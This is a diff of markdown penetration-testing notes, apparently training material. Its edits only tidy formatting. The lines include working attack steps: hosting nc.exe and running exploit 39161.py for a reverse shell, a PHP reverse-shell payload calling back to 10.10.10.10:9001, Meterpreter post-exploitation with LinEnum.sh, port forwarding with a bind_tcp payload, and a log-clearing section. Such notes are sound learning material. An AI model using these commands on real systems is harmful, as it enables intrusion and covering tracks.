@@ -1933,7 +1933,7 @@ Offline Exploit-db database
 - `cp /usr/share/windows-resources/binaries/nc.exe .`- we must host nc.exe for exploitation
 - `python3 -m http.server 80` - we must host nc.exe for exploitation
 - `nc -nlvp 1234`
-- `python3 [39161.py] <target> 80` - downloads nc.exe from our web server, and we get a reverse shell.
+- `python3 39161.py <target> 80` - downloads nc.exe from our web server, and we get a reverse shell.
 
 If it doesn’t work, then we must run the exploit file again until it works.
 
@@ -2121,7 +2121,7 @@ vsftpd 2.3.4 is vulnerable to a malicious backdoor that is added to the download
 - If a webserver is Apache, we can check *http://<ip>/phpinfo.php* - for the **version** info
 - `searchsploit php <version>` - versions under **5.3.12** are vulnerable to a command injection
 - `searchsploit -m 18336`
-- `nano [18836.py](http://18836.py)` - changing `pwn_code` line to a php reverse shell executable (`<?php $sock=fsockopen("**10.10.10.10**",**9001**);exec("**sh** <&4 >&4 2>&4");?>`)
+- `nano 18836.py` - changing `pwn_code` line to a php reverse shell executable (`<?php $sock=fsockopen("10.10.10.10",9001);exec("sh <&4 >&4 2>&4");?>`)
 - `nc -nlvp 1234`
 - `python2 18836.py <ip> <port>`
 
@@ -2316,7 +2316,7 @@ Process is an executable that is running, service is a process that is running i
     - `msf6> use enum_system`
     - `msf6> use checkvm`
 - `meterpreter > cd /tmp`
-- `meterpreter > upload [LinEnum.sh](http://LinEnum.sh)` - from GitHub
+- `meterpreter > upload LinEnum.sh` - from GitHub
 - `meterpreter > shell`
     - `chmod +x LinEnum.sh`
     - `./LinEnum.sh`
@@ -2450,7 +2450,7 @@ Requires elevated privileges
 - `meterpreter > portfwd add -l 1080 -p 80 -r <ip>`
 - `nmap -sV -p 1080 127.0.0.1`
 - `msf6> use badblue_passthru` - second exploitation after port forwarding
-    - `set payload windows/meterpreter/**bind_tcp**`
+    - `set payload windows/meterpreter/bind_tcp`
     - `set rhosts <ip>`
 
 ## Clearing logs
